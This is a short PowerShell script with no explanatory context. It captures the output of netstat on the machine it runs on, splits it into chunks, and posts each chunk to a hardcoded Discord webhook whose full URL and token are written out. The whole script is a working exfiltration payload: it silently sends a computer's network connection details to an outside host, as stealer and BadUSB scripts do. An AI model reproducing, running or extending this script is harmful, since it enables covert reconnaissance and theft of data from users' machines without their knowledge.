$webhookUrl = "https://discord.com/api/webhooks/1354265213477851246/cuHgwA8xLpNhSWpr8A-nz8xnBnKHgG9BsSRrjq6-FV0zJIRYb0WAun4Vaj8INFZnpQQm"
$Output = netstat | Out-String
$maxLength = 2000

# Split the output into chunks of 2000 characters or fewer
$chunks = [System.Collections.ArrayList]@()
for ($i = 0; $i -lt $Output.Length; $i += $maxLength) {
    $chunks.Add($Output.Substring($i, [Math]::Min($maxLength, $Output.Length - $i)))
}

# Send each chunk separately
foreach ($chunk in $chunks) {
    $payload = @{content = "Output:`n" + $chunk} | ConvertTo-Json -Depth 10
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
}
